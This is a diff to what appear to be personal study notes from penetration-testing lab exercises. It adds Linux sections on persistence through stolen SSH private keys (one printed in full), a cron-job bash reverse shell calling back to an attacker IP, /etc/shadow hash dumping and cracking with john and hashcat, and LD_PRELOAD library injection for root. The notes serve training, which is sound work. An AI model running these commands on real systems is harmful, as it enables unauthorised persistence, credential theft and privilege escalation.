@@ -90,6 +90,8 @@ netstat -ano
 ```
 Windows Firewall state
 ```powershell
+Windows Firewall state
+#or
 netsh advfirewall firewall show
 #or
 netsh advfirewall firewall show rule
@@ -272,8 +274,7 @@ Note: Elevated/Administrative privileges are required in order to access and int
 	- All characters are then converted into uppercase.
 	- Each chunk is then hashed separately with the DES algorithm.
 - LM hashing is generally considered to be a weak protocol and can easily be cracked, primarily because the password hash does not include salts, consequently making brute-force and rainbow table attacks effective against LM hashes.!
-
-![Screenshot of SAM database explanation](Screenshot%202025-06-11%20114521.png)
+![[Screenshot 2025-06-11 114521.png]]
 
 #### NTLM (NTHash)
 - NTLM is a collection of authentication protocols that are utilized in Windows to facilitate authentication between computers. The authentication process involves using a valid username and password to authenticate successfully.
@@ -283,7 +284,7 @@ Note: Elevated/Administrative privileges are required in order to access and int
 	- Does not split the hash in to two chunks.
 	- Case sensitive.
 	- Allows the use of symbols and unicode characters.
-![Screenshot](Screenshot%202025-06-11%20114716.png)
+![[Screenshot 2025-06-11 114716.png]]
 ### **5-Searching For Passwords In Windows Configuration Files**
 - Windows can automate a variety of repetitive tasks, such as the mass rollout or installation of Windows on many systems.
 - This is typically done through the use of the Unattended Windows Setup utility, which is used to automate the mass installation/deployment of Windows on systems.
@@ -715,7 +716,206 @@ root👻docker-desktop:~#
 - This is primarily because, any script or command that is run by a Cron job will run as the root user and will consequently provide us with root access.
 - In order to elevate our privileges, we will need to find and identify cron jobs scheduled by the root user or the files being processed by the cron job.
 
+### **5-Persistence Via SSH Keys**
+- Linux is typically deployed as a server operating system and as a result, Linux servers are typically accessed remotely via services/protocols such as SSH.  
+- If SSH is enabled and running on a Linux system you have compromised, you can take advantage of the SSH configuration to establish persistent access on the target system.
+- In most cases Linux servers will have key-based authentication enabled for the SSH service, allowing users to access the Linux system remotely without the need for a password. 
+- After gaining access to a Linux system, we can transfer the SSH private key of a specific user account to our system and use that SSH private key for all future authentication and access.
+```bash
+student@demo:~$ ls -la
+total 24
+drwxr-xr-x 1 student student 4096 Jun 19 17:27 .
+drwxr-xr-x 1 root    root    4096 Apr 26  2019 ..
+drwx------ 2 student student 4096 Jun 19 17:27 .cache
+drwxr-xr-x 1 root    root    4096 Apr 26  2019 .ssh
+student@demo:~$ cd .ssh/
+student@demo:~/.ssh$ ls
+authorized_keys  id_rsa
+student@demo:~/.ssh$ cat authorized_keys 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDckfXMLVYm4nYoI9/VR0l7V1f5SHhoT1Eqye5CTXbh44HrTX/z5Dq4l6PfyChVhDsNzgg0r0+r1w6z64NB9F2NLX/1LtrRsNU5FHpD8Td3JrREOzMtxqpfouQ+CcFnaBLfsTiZfqSLAS9h6poAbIWrJ+f5A8uiz9mdzcQDgDvUs8WDTVsCakjoZtprtRQb4wJmgzSoM2jkzOvlua0KdU4pDqfRDHvOe7kDanTRN/OYCjt6tnzrElR9dChUXOqYg2qFkoVm2OBXmeT+oeCfUE/J3o2hZ5cAN0gkqLuKriOiZP43L78eXGsCzUgmHG2tITFIxOSqYf/cp5f2JsFZfNjV root@localhost
+student@demo:~/.ssh$ cat id_rsa 
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA3JH1zC1WJuJ2KCPf1UdJe1dX+Uh4aE9RKsnuQk124eOB601/
+8+Q6uJej38goVYQ7Dc4INK9Pq9cOs+uDQfRdjS1/9S7a0bDVORR6Q/E3dya0RDsz
+LcaqX6LkPgnBZ2gS37E4mX6kiwEvYeqaAGyFqyfn+QPLos/Znc3EA4A71LPFg01b
+AmpI6Gbaa7UUG+MCZoM0qDNo5Mzr5bmtCnVOKQ6n0Qx7znu5A2p00TfzmAo7erZ8
+6xJUfXQoVFzqmINqhZKFZtjgV5nk/qHgn1BPyd6NoWeXADdIJKi7iq4jomT+Ny+/
+HlxrAs1IJhxtrSExSMTkqmH/3KeX9ibBWXzY1QIDAQABAoIBAEO0liOvgvN6rlRR
+9sJMGJVA0WNWyIcUWdDtnTJC/wwFvvqQlocx9oh1G7t0gFUHuuzY4pHxgl44LG40
+C91x+kl8vvtu/4JAaqMT0xgJ8kGj4s/S8DnL8r5ajP8yFWj9fFWn27zaL/3vRjEj
+R1R7+2f3XvCEJrz6Wk1jPRjqAvOeDRGH3ojsQwWO7k/FcvtqVBCPTGxyUBzXYv06
+fM3OY5NL8D7t/bLoHa8dVhqjPnfUR7/IpiAdxEam1X0ObPB5YyBwSlpj6h904bF/
++U697IE23xjVmKMKcvTLe6QAxuRGSMf3/k3rCpDd3UxYF+P2e0CK3MefWjKpAe8r
+2xRXyB0CgYEA+7zgmuhJqjik8tbt6b6+ZAJZ68TqLE1f3YEW/LivMeMj5tQZo/w+
+0ZJnr6hR3eicMMxWKufGXSEtbs1TzMGvA5SXI9MTu62a5A2h7NDbLuKRwdjh9Qv6
+TocFSMTSFcS4jvmbeYlVaSZWrJLLKY6lsjgdjDB4DH7Uc0Anxdr//GsCgYEA4E39
+rlB7GWoCX7oXpSEGCHkQkmgX5IDU7+UUySFqD8fWoLsAc47R/TmDsKI+x83PF5jG
+oo5P5LmUIeqnAKknTSyfD1YFtMa3tpTE68R9j/uueTK7v5izwWQjicmILm4RdkZJ
+TVVH2b0aIQaUnpWWwHLa+BYx2jH4S2GxH89vz78CgYEA211SyApFLw0fR/Hc7kRm
+OlYGL7qvaR2fvTDhbCYvnKRXQ61uDoUf5JXUvrBJbrtlZ+yX5dmE9OCVa6mHLbVV
+oiQYtIIZ/wCgKbxrbybs6OVMqIQrGtNuMoHcK/Y/L/L19Lk0L2tqPy/GdamRWkxQ
+vYXC0cfmxNS8oxWz0uktCrMCgYB6ufF9OMfBxgD6g4WAciss46CvmojIG71mbL8M
+tV2kuMC0PN0oXRKELL3jHUKga/lNfefg9WC9UtS8IfmyINtCHJIDABwrJzdJjOiZ
+326cIyb5ZUrYsCJaRAI117DNRqgDQL3GtEyV1CPBwin7Avny3mT0rKAmNIUYKaGS
+OBuDXQKBgQDIRYOZEaV8rXx3wN24NYuByNUpRM3AIyPIwAuaPklWD6D2KdDveheI
+lZtRb6Yzzmeon0DuLPdl7e/R7e5Z8Mx3o40aiJLULlw95JqON3J3W471PZAG1L/g
+59PKgUMBNVX9UsUqvHyWlcY/FAT9UhWblgDoN3uXY9Db6q5x7hWzKw==
+-----END RSA PRIVATE KEY-----
+student@demo:~/.ssh$ exit
+logout
+Connection to demo.ine.local closed.
+# copy the rsa private key and paste it in a file called id_rsa
 
+┌──(root㉿INE)-[~]
+└─# nano id_rsa
 
+┌──(root㉿INE)-[~]
+└─# ssh -i id_rsa student@demo.ine.local
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0644 for 'id_rsa' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key "id_rsa": bad permissions
+student@demo.ine.local's password:
 
+┌──(root㉿INE)-[~]
+└─# chmod 400 id_rsa
 
+┌──(root㉿INE)-[~]
+└─# ssh -i id_rsa student@demo.ine.local                                                                                                                                                                                             
+Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 6.8.0-40-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Thu Jun 19 17:30:48 2025 from 192.60.216.2
+student@demo:~$ 
+
+```
+### **6-Persistence Via Cron Jobs**
+- Linux implements task scheduling through a utility called Cron. Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specified schedule. 
+- An application, or script that has been configured to be run repeatedly with Cron is known as a Cron job. 
+- We can use cron jobs to execute a command or script at a fixed interval to ensure we have persistent access to the target system.
+```bash
+student@demo:~$ echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.224.127.2/4444 0>&1'" > cron
+student@demo:~$ cat cron 
+* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.224.127.2/4444 0>&1'
+student@demo:~$ crontab -i cron
+student@demo:~$ crontab -l
+* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.224.127.2/4444 0>&1'
+student@demo:~$ bash -i >& /dev/tcp/192.224.127.2/4444 0>&1
+-bash: connect: Connection refused
+-bash: /dev/tcp/192.224.127.2/4444: Connection refused
+student@demo:~$ /bin/bash -c 'bash -i >& /dev/tcp/192.224.127.2/4444 0>&1'
+/bin/bash: connect: Connection refused
+/bin/bash: /dev/tcp/192.224.127.2/4444: Connection refused
+student@demo:~$ /bin/bash -c 'bash -i >& /dev/tcp/192.224.127.2/4444 0>&1'
+/bin/bash: connect: Connection refused
+/bin/bash: /dev/tcp/192.224.127.2/4444: Connection refused
+student@demo:~$ /bin/bash -c 'bash -i >& /dev/tcp/192.224.127.2/4444 0>&1'
+student@demo:~$ crontab -l
+* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.224.127.2/4444 0>&1'
+student@demo:~$ exit
+logout
+Connection to 192.224.127.3 closed.
+
+┌──(root㉿INE)-[~]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.224.127.2] from (UNKNOWN) [192.224.127.3] 43704
+bash: cannot set terminal process group (226): Inappropriate ioctl for device
+bash: no job control in this shell                                                 
+student@demo:~$                                                                 
+```
+### **7-Dumping & Cracking Linux Password Hashes**
+- Linux has multi-user support and as a result, multiple users can access the system simultaneously. This can be seen as both an advantage and disadvantage from a security perspective, in that, multiple accounts offer multiple access vectors for attackers and therefore increase the overall risk of the server. 
+- All of the information for all accounts on Linux is stored in the passwd file located in: /etc/passwd 
+- We cannot view the passwords for the users in the passwd file because they are encrypted and the passwd file is readable by any user on the system. 
+- All the encrypted passwords for the users are stored in the shadow file. it can be found in the following directory: /etc/shadow 
+- The shadow file can only be accessed and read by the root account, this is a very important security feature as it prevents other accounts on the system from accessing the hashed passwords
+- The shadow file gives us information in regards to the hashing algorithm that is being used and the password hash, this is very helpful as we are able to determine the type of hashing algorithm that is being used and its strength. We can determine this by looking at the number after the username encapsulated by the dollar symbol ($)
+
+| Value | Hashing Algorithm |
+| ----- | ----------------- |
+| $1    | MD5               |
+| $2    | Blowfish          |
+| $5    | SHA-256           |
+| $6    | SHA-512           |
+After elevating your privileges
+```bash
+root@ahmed:/home/ahmed# cat /etc/shadow       
+root:$6$VhinDVzmbiLkCT6g$uTsJMpPf/WQq1CJajBcd9ULRteCNq/joezX32NX6.MUBU5.TO1olHcCwCQgK8WiDtdJP.ZLlyGW1LUhBAIsaM/:20258:0:99999:7:::
+```
+the root password hash is SHA-512
+decrypting the hash using john
+```bash
+root@ahmed:/usr/share/wordlists# john --format=sha512crypt hash rockyou.txt 
+Created directory: /root/.john
+Warning: invalid UTF-8 seen reading rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 8 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+root             (root)     
+1g 0:00:00:00 DONE 1/3 (2025-06-19 14:37) 14.28g/s 228.5p/s 228.5c/s 228.5C/s root..root4
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+root@ahmed:/usr/share/wordlists# 
+```
+decrypting the hash using hashcat
+```bash
+root@ahmed:/usr/share/wordlists# hashcat -a3 -m 1800 hash rockyou.txt 
+```
+### **8-Shared Library Injection**
+#### Shared Library
+- In Linux, a shared library (also known as a dynamic library or dynamic shared object, typically with a .so extension) is a file that contains code and data that can be loaded by multiple processes at runtime.
+- Shared libraries allow code to be modular, reusable, and reduce memory usage, as multiple processes can use the same shared code.
+#### Injection
+- Shared library injection involves injecting a custom shared library into a running process to execute arbitrary code or manipulate the process's behavior.
+- This technique can be used for various purposes, such as debugging, monitoring, or, in the context of privilege escalation, executing code with higher privileges.
+
+```bash
+student@target:~$ sudo -l
+Matching Defaults entries for student on target:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
+
+User student may run the following commands on target:
+    (root) NOPASSWD: /usr/sbin/apache2
+student@target:~$ nano shell.c
+bash: nano: command not found
+student@target:~$ vim shell.c
+student@target:~$ cat shell.c
+#include <studio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+        unsetenv("LD_PRELOAD");
+        setgid(0);
+        setuid(0);
+        system("/bin/bash");
+}
+student@target:~$ gcc -fPIC -o shell.so shell.c -nostartfiles
+shell.c: In function '_init':
+shell.c:6:2: warning: implicit declaration of function 'setgid'; did you mean 'setenv'? [-Wimplicit-function-declaration]
+  setgid(0);
+  ^~~~~~
+  setenv
+shell.c:7:2: warning: implicit declaration of function 'setuid'; did you mean 'setenv'? [-Wimplicit-function-declaration]
+  setuid(0);
+  ^~~~~~
+  setenv
+/usr/bin/x86_64-linux-gnu-ld: warning: cannot find entry symbol _start; defaulting to 0000000000000420
+student@target:~$ ls
+shell.c  shell.so
+student@target:~$ sudo LD_PRELOAD=/home/student/shell.so apache2
+root@target:~#
+```
